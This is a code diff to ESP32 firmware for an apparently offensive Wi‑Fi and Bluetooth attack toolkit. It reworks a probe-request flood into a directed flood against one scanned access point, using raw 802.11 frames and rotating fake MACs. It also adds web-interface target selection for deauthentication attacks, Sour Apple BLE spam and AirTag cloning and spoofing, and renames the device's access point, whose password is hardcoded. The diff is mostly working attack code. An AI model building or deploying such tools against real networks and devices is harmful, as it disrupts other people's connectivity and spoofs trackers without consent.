@@ -292,9 +292,9 @@ static void beaconStart() {
   beaconSweep = 0;
   beaconRandomMac();
   if (webMode) {
-    // Keep ESP32-1 AP; only change channel for TX
+    // Keep ESP32-TYPHON AP; only change channel for TX
     WiFi.mode(WIFI_AP);
-    WiFi.softAP("ESP32-1", "rgisking", beaconCh, 0, 4);
+    WiFi.softAP("ESP32-TYPHON", "rgisking", beaconCh, 0, 4);
   } else {
     WiFi.mode(WIFI_AP);
     // minimal AP so WIFI_IF_AP exists for TX
@@ -524,7 +524,7 @@ static void deauthStart(int targetIdx) {
   if (ch < 1 || ch > 13) ch = 1;
   if (webMode) {
     WiFi.mode(WIFI_AP);
-    WiFi.softAP("ESP32-1", "rgisking", ch, 0, 4);
+    WiFi.softAP("ESP32-TYPHON", "rgisking", ch, 0, 4);
   } else {
     WiFi.mode(WIFI_AP);
     WiFi.softAP("esp32div", nullptr, ch, 1, 0);
@@ -600,7 +600,7 @@ static void deauthStartAll() {
   deauthLast = 0;
   if (webMode) {
     WiFi.mode(WIFI_AP);
-    WiFi.softAP("ESP32-1", "rgisking", 1, 0, 4);
+    WiFi.softAP("ESP32-TYPHON", "rgisking", 1, 0, 4);
   } else {
     WiFi.mode(WIFI_AP);
     WiFi.softAP("esp32div", nullptr, 1, 1, 0);
@@ -609,9 +609,10 @@ static void deauthStartAll() {
 }
 
 // ============================================================
-//  Probe Flood (improved probe request)
+//  Probe Flood – directed stress-test against one AP
 // ============================================================
 static bool probeRunning = false;
+static int  probeTarget = -1;   // index into wifiNets (required)
 static uint32_t probeSent = 0;
 static uint32_t probeLast = 0;
 static uint8_t  probeCh = 1;
@@ -623,42 +624,38 @@ static void probeRandomMac() {
   probeMac[0] = (probeMac[0] | 0x02) & 0xFE;
 }
 
-static int probeSsidIdx = 0;
-
-static int probeBuildNamed(const char* ssid) {
+// Directed probe: Dest + BSSID = AP, SSID = target network name, DS channel = AP channel
+static int probeBuildDirected(const char* ssid, const uint8_t* bssid, uint8_t ch) {
   memset(probePacket, 0, sizeof(probePacket));
   uint8_t* p = probePacket;
-  *p++ = 0x40; *p++ = 0x00;
-  *p++ = 0x00; *p++ = 0x00;
-  memset(p, 0xFF, 6); p += 6;
-  memcpy(p, probeMac, 6); p += 6;
-  memset(p, 0xFF, 6); p += 6;
-  *p++ = 0x00; *p++ = 0x00;
-  // SSID (empty = wildcard)
+  *p++ = 0x40; *p++ = 0x00;           // Probe Request
+  *p++ = 0x00; *p++ = 0x00;           // Duration
+  memcpy(p, bssid, 6); p += 6;        // Dest = AP (directed)
+  memcpy(p, probeMac, 6); p += 6;     // Source = fake STA
+  memcpy(p, bssid, 6); p += 6;        // BSSID = AP
+  *p++ = 0x00; *p++ = 0x00;           // Seq (filled loosely)
   uint8_t sl = ssid ? (uint8_t)strnlen(ssid, 32) : 0;
-  *p++ = 0x00; *p++ = sl;
+  *p++ = 0x00; *p++ = sl;             // SSID IE
   if (sl) { memcpy(p, ssid, sl); p += sl; }
-  *p++ = 0x01; *p++ = 0x08;
+  *p++ = 0x01; *p++ = 0x08;           // Supported rates
   *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
   *p++ = 0x0C; *p++ = 0x12; *p++ = 0x18; *p++ = 0x24;
-  *p++ = 0x03; *p++ = 0x01; *p++ = probeCh;
+  *p++ = 0x03; *p++ = 0x01; *p++ = ch; // DS Parameter Set
   return (int)(p - probePacket);
 }
 
-static void probeBuild() {
-  probeBuildNamed(nullptr);  // wildcard default
-}
-
-static void probeStart() {
+static void probeStart(int targetIdx) {
+  if (targetIdx < 0 || targetIdx >= wifiCount) return;
+  probeTarget = targetIdx;
   probeRunning = true;
   probeSent = 0;
   probeLast = 0;
-  probeCh = 1;
+  probeCh = wifiNets[targetIdx].ch;
+  if (probeCh < 1 || probeCh > 13) probeCh = 1;
   probeRandomMac();
-  probeBuild();
   if (webMode) {
     WiFi.mode(WIFI_AP);
-    WiFi.softAP("ESP32-1", "rgisking", probeCh, 0, 4);
+    WiFi.softAP("ESP32-TYPHON", "rgisking", probeCh, 0, 4);
   } else {
     WiFi.mode(WIFI_AP);
     WiFi.softAP("esp32div", nullptr, probeCh, 1, 0);
@@ -679,27 +676,24 @@ static void probeStop() {
 
 static void probeUpdate() {
   if (!probeRunning) return;
-  if (millis() - probeLast < 8) return;
+  if (probeTarget < 0 || probeTarget >= wifiCount) { probeStop(); return; }
+  if (millis() - probeLast < 5) return;  // aggressive stress cadence
   probeLast = millis();
 
-  const char* ssid = nullptr;
-  if (wifiCount > 0 && (probeSent % 3) != 0) {
-    ssid = wifiNets[probeSsidIdx % wifiCount].ssid.c_str();
-    probeSsidIdx++;
-  }
-  int len = probeBuildNamed(ssid);
+  const char* ssid = wifiNets[probeTarget].ssid.c_str();
+  const uint8_t* bssid = wifiNets[probeTarget].bssid;
+  probeCh = wifiNets[probeTarget].ch;
+  if (probeCh < 1 || probeCh > 13) probeCh = 1;
+
+  // Occasional MAC rotation so AP sees many "clients" probing
+  if ((probeSent % 40) == 0) probeRandomMac();
+
+  int len = probeBuildDirected(ssid, bssid, probeCh);
   esp_wifi_set_channel(probeCh, WIFI_SECOND_CHAN_NONE);
-  for (int i = 0; i < 6; i++) {
+  for (int i = 0; i < 8; i++) {
     esp_wifi_80211_tx(WIFI_IF_AP, probePacket, len, false);
     delay(1);
     probeSent++;
-  }
-  // Hop 1/6/11 so probes are visible across common channels
-  if (probeSent % 18 == 0) {
-    static const uint8_t chs[] = {1, 6, 11};
-    static uint8_t hi = 0;
-    probeCh = chs[hi++ % 3];
-    probeRandomMac();
   }
 }
 
@@ -785,7 +779,7 @@ static void captiveUpdate() {
 
 // ============================================================
 //  Soft-AP Web UI mode  (BOOT held 2 s)
-//  SSID: ESP32-1   Password: rgisking
+//  SSID: ESP32-TYPHON   Password: rgisking
 //  Full handlers live after BLE tools (see below).
 // ============================================================
 static uint32_t bootHoldStart = 0;
@@ -803,7 +797,7 @@ static void restoreWebAP() {
   if (!webMode) return;
   // Keep Soft-AP alive for the browser session
   WiFi.mode(WIFI_AP);
-  WiFi.softAP("ESP32-1", "rgisking");
+  WiFi.softAP("ESP32-TYPHON", "rgisking");
   delay(80);
 }
 
@@ -1717,7 +1711,7 @@ label.lbl{font-size:.75rem;color:var(--dim);display:block;margin:8px 0 4px}
 .item{display:flex;justify-content:space-between;gap:8px;padding:10px 12px;border-bottom:1px solid var(--line);font-size:.82rem;align-items:flex-start}
 .item:last-child{border-bottom:0}
 .item .meta{color:var(--dim);font-size:.72rem;margin-top:2px}
-.item.active{background:#15324a}
+.item.active{background:#0a2a12;border-left:3px solid var(--acc)}
 .dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--ok);margin-right:6px;vertical-align:middle}
 .rssi-g{color:#2ee59d}.rssi-y{color:#ffd84d}.rssi-o{color:#ffb020}.rssi-r{color:#ff5a6a}
 .enc{font-size:.7rem;padding:2px 7px;border-radius:6px;background:#1a2736;color:var(--dim);margin-left:6px}
@@ -1728,6 +1722,10 @@ label.lbl{font-size:.75rem;color:var(--dim);display:block;margin:8px 0 4px}
 .bar{height:5px;background:#1a2736;border-radius:99px;overflow:hidden;margin-top:8px}
 .bar>i{display:block;height:100%;width:0;background:var(--acc);transition:width .25s}
 .stopall{width:100%;margin-top:12px}
+.targetBar{background:#0a1a0a;border:1px solid var(--acc);border-radius:10px;padding:10px 12px;margin-bottom:12px;font-size:.85rem}
+.targetBar .lbl{color:var(--dim);font-size:.7rem;text-transform:uppercase;letter-spacing:.06em;margin-bottom:4px}
+.targetBar .val{color:var(--acc);font-weight:700;font-size:.95rem;word-break:break-all}
+.targetBar.empty .val{color:var(--err);font-weight:600}
 </style>
 </head>
 <body>
@@ -1743,7 +1741,7 @@ label.lbl{font-size:.75rem;color:var(--dim);display:block;margin:8px 0 4px}
 <div id="v-home" class="view active">
   <div class="grid">
     <div class="tile" onclick="go('wifi')"><div class="ico">📡</div><h2>Wi‑Fi Tools</h2><p>Scan, monitor, beacon, deauth, probe</p></div>
-    <div class="tile" onclick="go('ble')"><div class="ico">🔵</div><h2>Bluetooth</h2><p>Scan, spoof, Sour Apple, jam, AirTag</p></div>
+    <div class="tile" onclick="go('ble')"><div class="ico">🔵</div><h2>Bluetooth</h2><p>Scan, sniff, spoof, Sour Apple, jam, AirTag detect/spoof</p></div>
   </div>
   <button class="danger stopall" onclick="act('stop_all')">Stop all tools</button>
   <div class="msg" id="sysMsg"></div>
@@ -1826,7 +1824,7 @@ label.lbl{font-size:.75rem;color:var(--dim);display:block;margin:8px 0 4px}
 <div id="v-wifi-deauth" class="view">
   <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Deauth Attack</h2></div>
   <div class="card">
-    <h3>Target</h3>
+    <div class="targetBar empty" id="deauthTargetBar"><div class="lbl">Selected target</div><div class="val" id="deauthTargetLabel">None — tap a network below</div></div>
     <div class="msg">Scan Wi‑Fi first, then tap a network</div>
     <div class="list" id="deauthList"></div>
     <div class="row">
@@ -1849,7 +1847,9 @@ label.lbl{font-size:.75rem;color:var(--dim);display:block;margin:8px 0 4px}
 <div id="v-wifi-probe" class="view">
   <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Probe Flood</h2></div>
   <div class="card">
-    <h3>Probe</h3>
+    <div class="targetBar empty" id="probeTargetBar"><div class="lbl">Selected target</div><div class="val" id="probeTargetLabel">None — tap a network below</div></div>
+    <div class="msg">Scan Wi‑Fi first, then tap a network to stress-test</div>
+    <div class="list" id="probeList"></div>
     <div class="row"><button id="btnProbe" class="attack" onclick="toggle('probe')">Start</button></div>
     <div class="msg">Sent: <b id="probeSent">0</b></div>
   </div>
@@ -1901,9 +1901,9 @@ label.lbl{font-size:.75rem;color:var(--dim);display:block;margin:8px 0 4px}
 <div id="v-ble-sour" class="view">
   <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">Sour Apple</h2></div>
   <div class="card">
-    <h3>Model / Action</h3>
-    <label class="lbl">Select what to advertise</label>
-    <select id="sourIdx"><option value="-1">Random Mix</option></select>
+    <div class="targetBar" id="sourTargetBar"><div class="lbl">Selected target</div><div class="val" id="sourTargetLabel">Random Mix</div></div>
+    <label class="lbl">Model / action</label>
+    <select id="sourIdx" onchange="onSourChange()"><option value="-1">Random Mix</option></select>
     <div class="row"><button id="btnSour" class="attack" onclick="toggle('sour')">Start</button></div>
     <div class="msg">Sent: <b id="sourSent">0</b> · Active: <b id="sourName">—</b></div>
   </div>
@@ -1921,22 +1921,27 @@ label.lbl{font-size:.75rem;color:var(--dim);display:block;margin:8px 0 4px}
 <div id="v-ble-airdet" class="view">
   <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">AirTag Detector</h2></div>
   <div class="card">
-    <h3>Scan for AirTags</h3>
-    <div class="row"><button id="btnAirDet" onclick="toggleAirDet()">Start</button></div>
+    <div class="targetBar empty" id="airDetTargetBar"><div class="lbl">Selected target</div><div class="val" id="airSelectedLabel">None — tap a device below</div></div>
+    <div class="row"><button id="btnAirDet" onclick="toggleAirDet()">Start scan</button></div>
     <div class="msg">Found: <b id="airCount">0</b></div>
     <div class="list" id="airList"></div>
+    <div class="row" style="margin-top:10px">
+      <button class="attack" id="btnAirSpoofSel" onclick="spoofSelectedAir()">Spoof selected</button>
+      <button class="sec" onclick="go('ble-air')">Open spoofer →</button>
+    </div>
   </div>
 </div>
 
 <div id="v-ble-air" class="view">
   <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">AirTag Spoofer</h2></div>
   <div class="card">
-    <h3>Clone / Spam</h3>
-    <div class="msg">Run Detector first to capture real payloads, or start for synthetic Find My ADV.</div>
+    <div class="targetBar" id="airSpoofTargetBar"><div class="lbl">Selected target</div><div class="val" id="airSpoofTargetLabel">Spam all / synthetic</div></div>
+    <div class="msg">Use Detector first for real payloads. Synthetic Find My ADV if list is empty.</div>
     <label class="lbl">Target</label>
-    <select id="airTarget"><option value="-1">Spam all / synthetic</option></select>
+    <select id="airTarget" onchange="onAirTargetChange()"><option value="-1">Spam all / synthetic</option></select>
     <div class="row">
       <button id="btnAir" class="attack" onclick="toggle('air')">Start</button>
+      <button class="sec" onclick="go('ble-airdet')">← Detector</button>
     </div>
     <div class="msg">Sent: <b id="airSent">0</b> · Captured: <b id="airCount2">0</b></div>
   </div>
@@ -1990,7 +1995,40 @@ function renderBle(list){
   document.getElementById('bleList').innerHTML=html;
   document.getElementById('bleList2').innerHTML=html;
 }
-function pickDeauth(i){deauthTarget=i;renderWifi(S.wifi||[]);}
+function setTargetBar(barId,labelId,text,isEmpty){
+  const bar=document.getElementById(barId);
+  const lab=document.getElementById(labelId);
+  if(lab) lab.textContent=text||'None';
+  if(bar) bar.classList.toggle('empty', !!isEmpty);
+}
+function pickDeauth(i){
+  deauthTarget=i;
+  renderWifi(S.wifi||[]);
+  const list=S.wifi||[];
+  if(list[i]) setTargetBar('deauthTargetBar','deauthTargetLabel', list[i].ssid+' · CH'+list[i].ch+' · '+(list[i].bssid||''), false);
+  else setTargetBar('deauthTargetBar','deauthTargetLabel','None — tap a network below', true);
+}
+let probeTarget=-1;
+function pickProbe(i){
+  probeTarget=i;
+  renderProbe(S.wifi||[]);
+  const list=S.wifi||[];
+  if(list[i]) setTargetBar('probeTargetBar','probeTargetLabel', list[i].ssid+' · CH'+list[i].ch+' · '+(list[i].bssid||''), false);
+  else setTargetBar('probeTargetBar','probeTargetLabel','None — tap a network below', true);
+}
+function renderProbe(list){
+  const el=document.getElementById('probeList');
+  if(!el) return;
+  const empty='<div class="item"><span>No networks — run Wi‑Fi scan first</span></div>';
+  if(!list||!list.length){el.innerHTML=empty;return;}
+  el.innerHTML=list.map((n,i)=>{
+    const act=(probeTarget===i)?' active':'';
+    return `<div class="item${act}" onclick="pickProbe(${i})">
+      <div><b>${esc(n.ssid)}</b><span class="enc">${esc(n.enc||'')}</span>
+        <div class="meta">${esc(n.bssid||'')} · CH ${n.ch}</div></div>
+      <div class="${rssiClass(n.rssi)}">${n.rssi} dBm</div></div>`;
+  }).join('');
+}
 function fillApple(names){if(appleReady||!names)return;const sel=document.getElementById('sourIdx');names.forEach((n,i)=>{const o=document.createElement('option');o.value=i;o.textContent=n;sel.appendChild(o);});appleReady=true;}
 function setToggle(id,on){const b=document.getElementById(id);if(!b)return;b.textContent=on?'Stop':'Start';b.classList.toggle('on',!!on);}
 function setMode(m){
@@ -2029,10 +2067,24 @@ function apply(s){
   setToggle('btnAir', s.air);
   renderAir(s.airtags);
   fillAirTargets(s.airtags);
+  if(airSelected>=0 && s.airtags && s.airtags[airSelected]){
+    const t=(s.airtags[airSelected].name||'AirTag')+' · '+(s.airtags[airSelected].addr||'');
+    setTargetBar('airDetTargetBar','airSelectedLabel', t, false);
+    setTargetBar('airSpoofTargetBar','airSpoofTargetLabel', t, false);
+  }
   document.getElementById('sourSent').textContent=s.sourSent||0;
   document.getElementById('sourName').textContent=s.sourName||'—';
   document.getElementById('wscanMsg').textContent=s.wifiScanning?'Scanning… keeping previous list until done':((s.wifi&&s.wifi.length)?(s.wifi.length+' networks'):'No networks yet');
-  renderWifi(s.wifi); renderBle(s.ble); fillApple(s.apple);
+  renderWifi(s.wifi); renderProbe(s.wifi); renderBle(s.ble); fillApple(s.apple);
+  if(probeTarget>=0 && s.wifi && s.wifi[probeTarget]){
+    const n=s.wifi[probeTarget];
+    setTargetBar('probeTargetBar','probeTargetLabel', n.ssid+' · CH'+n.ch+' · '+(n.bssid||''), false);
+  }
+  if(typeof deauthTarget==='number' && deauthTarget>=0 && s.wifi && s.wifi[deauthTarget]){
+    const n=s.wifi[deauthTarget];
+    setTargetBar('deauthTargetBar','deauthTargetLabel', n.ssid+' · CH'+n.ch+' · '+(n.bssid||''), false);
+  }
+  if(s.sourName) setTargetBar('sourTargetBar','sourTargetLabel', s.sourName, false);
 }
 async function refresh(){try{const r=await fetch('/api/status');apply(await r.json());}catch(e){}}
 async function act(action,extra){
@@ -2049,6 +2101,7 @@ async function act(action,extra){
     }
   }
   if(action==='deauth_start' && body.target===undefined) body.target=deauthTarget;
+  if(action==='probe_start' && body.target===undefined) body.target=probeTarget;
   if(action==='spoof_start'){body.mode=parseInt(document.getElementById('spoofMode').value)||0;body.name=document.getElementById('spoofName').value||'';body.power=parseInt(document.getElementById('spoofPower').value)||9;body.interval=parseInt(document.getElementById('spoofInterval').value)||32;}
   if(action==='sour_start') body.idx=parseInt(document.getElementById('sourIdx').value);
   try{
@@ -2056,10 +2109,18 @@ async function act(action,extra){
     const j=await r.json();
     document.getElementById('sysMsg').textContent=j.msg||'';
     if(j.status) apply(j.status);
-  }catch(e){document.getElementById('sysMsg').textContent='Request failed — reconnect to ESP32-1';}
+  }catch(e){document.getElementById('sysMsg').textContent='Request failed — reconnect to ESP32-TYPHON';}
 }
 function toggle(tool){
   const on={pm:S.pm,beacon:S.beacon,deauth:S.deauth,det:S.det,probe:S.probe,spoof:S.spoof,sour:S.sour,jam:S.jam,air:S.air,sniff:S.sniff}[tool];
+  if(tool==='probe'){
+    if(on) act('probe_stop');
+    else {
+      if(probeTarget<0){document.getElementById('sysMsg').textContent='Select an AP from the list first';return;}
+      act('probe_start',{target:probeTarget});
+    }
+    return;
+  }
   if(tool==='air'){
     if(on) act('air_stop');
     else {
@@ -2070,13 +2131,53 @@ function toggle(tool){
   }
   if(on) act(tool+'_stop'); else act(tool+'_start');
 }
+let airSelected=-1;
 function renderAir(list){
   const el=document.getElementById('airList');
   if(!el) return;
   if(!list||!list.length){el.innerHTML='<div class="item"><span>No AirTags yet — start detector</span></div>';return;}
-  el.innerHTML=list.map(n=>`<div class="item"><div><b>${esc(n.name||'AirTag')}</b>
-    <div class="meta">${esc(n.addr||'')} · ${n.plen||0} B</div></div>
-    <div class="${rssiClass(n.rssi)}">${n.rssi} dBm</div></div>`).join('');
+  el.innerHTML=list.map((n,i)=>{
+    const act=(airSelected===i)?' active':'';
+    return `<div class="item${act}" onclick="pickAir(${i})"><div><b>${esc(n.name||'AirTag')}</b>
+      <div class="meta">${esc(n.addr||'')} · ${n.plen||0} B payload</div></div>
+      <div class="${rssiClass(n.rssi)}">${n.rssi} dBm</div></div>`;
+  }).join('');
+}
+function pickAir(i){
+  airSelected=i;
+  const list=S.airtags||[];
+  if(list[i]){
+    const t=(list[i].name||'AirTag')+' · '+(list[i].addr||'');
+    setTargetBar('airDetTargetBar','airSelectedLabel', t, false);
+    setTargetBar('airSpoofTargetBar','airSpoofTargetLabel', t, false);
+  } else {
+    setTargetBar('airDetTargetBar','airSelectedLabel','None — tap a device below', true);
+  }
+  const sel=document.getElementById('airTarget');
+  if(sel){sel.value=String(i); fillAirTargets(list); sel.value=String(i);}
+  renderAir(list);
+}
+function onAirTargetChange(){
+  const sel=document.getElementById('airTarget');
+  if(!sel) return;
+  const v=parseInt(sel.value);
+  airSelected=v;
+  if(v<0) setTargetBar('airSpoofTargetBar','airSpoofTargetLabel','Spam all / synthetic', false);
+  else {
+    const list=S.airtags||[];
+    if(list[v]) setTargetBar('airSpoofTargetBar','airSpoofTargetLabel',(list[v].name||'AirTag')+' · '+(list[v].addr||''), false);
+  }
+}
+function onSourChange(){
+  const sel=document.getElementById('sourIdx');
+  if(!sel) return;
+  const opt=sel.options[sel.selectedIndex];
+  setTargetBar('sourTargetBar','sourTargetLabel', opt?opt.text:'Random Mix', false);
+}
+function spoofSelectedAir(){
+  if(airSelected<0){document.getElementById('sysMsg').textContent='Select an AirTag from the list first';return;}
+  act('air_start',{target:airSelected});
+  go('ble-air');
 }
 let airTargetsReady=false, airTargetsSig='';
 function fillAirTargets(list){
@@ -2257,7 +2358,7 @@ static void handleWebApi() {
   else if (action == "wifi_scan") {
     if (webMode) {
       WiFi.mode(WIFI_AP_STA);
-      WiFi.softAP("ESP32-1", "rgisking");
+      WiFi.softAP("ESP32-TYPHON", "rgisking");
       delay(40);
     }
     wifiScanStart();
@@ -2312,7 +2413,15 @@ static void handleWebApi() {
   else if (action == "deauth_stop") { deauthStop(); msg = "Deauth stopped"; }
   else if (action == "det_start") { stopAllTools(); detStart(); msg = "Detector started"; }
   else if (action == "det_stop") { detStop(); msg = "Detector stopped"; }
-  else if (action == "probe_start") { stopAllTools(); probeStart(); msg = "Probe started"; }
+  else if (action == "probe_start") {
+    stopAllTools();
+    if (target < 0 || target >= wifiCount) {
+      msg = "Select a Wi-Fi target first (scan + tap)";
+    } else {
+      probeStart(target);
+      msg = String("Probe stress on ") + wifiNets[target].ssid;
+    }
+  }
   else if (action == "probe_stop") { probeStop(); msg = "Probe stopped"; }
   else if (action == "ble_scan") {
     sniffStop(); spoofStop(); sourStop(); jamStop(); airTagStop();
@@ -2381,7 +2490,7 @@ static void drawWebModeScreen() {
   tft.fillScreen(COL_BG);
   Theme::drawStatusBar("WEB MODE");
   Theme::printCentered("Soft-AP active", 28, COL_OK, 1);
-  Theme::printCentered("SSID: ESP32-1", 48, COL_FG, 1);
+  Theme::printCentered("SSID: ESP32-TYPHON", 48, COL_FG, 1);
   Theme::printCentered("Pass: rgisking", 64, COL_FG, 1);
   Theme::printCentered("http://192.168.4.1", 84, COL_ACCENT, 1);
   Theme::drawFooter("LED ON", "Hold BOOT=Exit");
@@ -2403,11 +2512,11 @@ static void enterWebMode() {
   webExitRequested = false;
   digitalWrite(STATUS_LED, HIGH);
   WiFi.mode(WIFI_AP);
-  WiFi.softAP("ESP32-1", "rgisking");
+  WiFi.softAP("ESP32-TYPHON", "rgisking");
   delay(150);
   setupWebRoutes();
   drawWebModeScreen();
-  Serial.println("[WEB] Soft-AP ESP32-1 / rgisking -> http://192.168.4.1");
+  Serial.println("[WEB] Soft-AP ESP32-TYPHON / rgisking -> http://192.168.4.1");
 }
 
 static void exitWebMode() {
@@ -2566,7 +2675,7 @@ void UI::handleInput(JoyAction a) {
 
   // Live tools
   if (_screen == SCR_PACKET_MON || _screen == SCR_BEACON ||
-      _screen == SCR_DEAUTH_DET || _screen == SCR_PROBE || _screen == SCR_CAPTIVE) {
+      _screen == SCR_DEAUTH_DET || _screen == SCR_CAPTIVE) {
     if (a == JOY_BACK) goBack();
     else if (a == JOY_SELECT) {
       if (_screen == SCR_PACKET_MON) { pmStop(); delay(20); pmStart(); _dirty = true; }
@@ -2577,9 +2686,6 @@ void UI::handleInput(JoyAction a) {
         _dirty = true;
       } else if (_screen == SCR_DEAUTH_DET) {
         deauthCount = 0; detMacSeen = false; _dirty = true;
-      } else if (_screen == SCR_PROBE) {
-        if (probeRunning) probeStop(); else probeStart();
-        _dirty = true;
       }
     } else if (_screen == SCR_BEACON && !beaconRunning &&
                (a == JOY_LEFT || a == JOY_RIGHT || a == JOY_HOLD_LEFT || a == JOY_HOLD_RIGHT)) {
@@ -2590,6 +2696,25 @@ void UI::handleInput(JoyAction a) {
       detMainOnly = !detMainOnly;
       detCh = 1;
       esp_wifi_set_channel(detCh, WIFI_SECOND_CHAN_NONE);
+      _dirty = true;
+    }
+    return;
+  }
+
+  // Probe stress – pick AP then flood
+  if (_screen == SCR_PROBE) {
+    if (probeRunning) {
+      if (a == JOY_BACK || a == JOY_SELECT) { probeStop(); _dirty = true; }
+      return;
+    }
+    if (a == JOY_BACK) { goBack(); return; }
+    if (wifiCount <= 0) return;
+    if (a == JOY_UP || a == JOY_HOLD_UP) {
+      if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
+    } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
+      if (_sel < wifiCount - 1) { _sel++; if (_sel >= _top + 6) _top = _sel - 5; _dirty = true; }
+    } else if (a == JOY_SELECT) {
+      probeStart(_sel);
       _dirty = true;
     }
     return;
@@ -2850,19 +2975,30 @@ static void drawDeauthScreen(int sel, int top) {
 }
 
 static void drawProbeScreen() {
-  Theme::drawStatusBar("Probe Flood");
+  Theme::drawStatusBar("Probe Stress");
+  char buf[28];
   if (probeRunning) {
-    Theme::printCentered("FLOODING", 40, COL_OK, 1);
-    char buf[24];
-    snprintf(buf, sizeof(buf), "%lu probes", (unsigned long)probeSent);
-    Theme::printCentered(buf, 58, COL_FG, 1);
-    snprintf(buf, sizeof(buf), "CH %d", probeCh);
-    Theme::printCentered(buf, 74, COL_DIM, 1);
+    Theme::printCentered("STRESSING", 28, COL_ERR, 1);
+    if (probeTarget >= 0 && probeTarget < wifiCount) {
+      char s[18];
+      const char* src = wifiNets[probeTarget].ssid.c_str();
+      int n = 0; while (src[n] && n < 15) { s[n] = src[n]; n++; }
+      s[n] = 0;
+      Theme::printCentered(s, 46, COL_FG, 1);
+      snprintf(buf, sizeof(buf), "CH%d  %lu", probeCh, (unsigned long)probeSent);
+      Theme::printCentered(buf, 64, COL_DIM, 1);
+    }
+    Theme::drawFooter("Sel=Stop", "L-Back");
+  } else if (wifiCount == 0) {
+    Theme::printCentered("No scan data", 50, COL_WARN, 1);
+    Theme::printCentered("Scan Wi-Fi first", 66, COL_DIM, 1);
+    Theme::drawFooter(nullptr, "L-Back");
   } else {
-    Theme::printCentered("STOPPED", 50, COL_WARN, 1);
-    Theme::printCentered("Sel = Start", 70, COL_DIM, 1);
+    static const char* items[WIFI_MAX_NETS];
+    for (int i = 0; i < wifiCount; i++) items[i] = wifiNets[i].ssid.c_str();
+    Theme::drawMenuList(items, wifiCount, _sel, _top, 18, 14);
+    Theme::drawFooter("Pick AP", "Sel=Start");
   }
-  Theme::drawFooter(nullptr, "L-Back");
 }
 
 static void drawCaptiveScreen() {
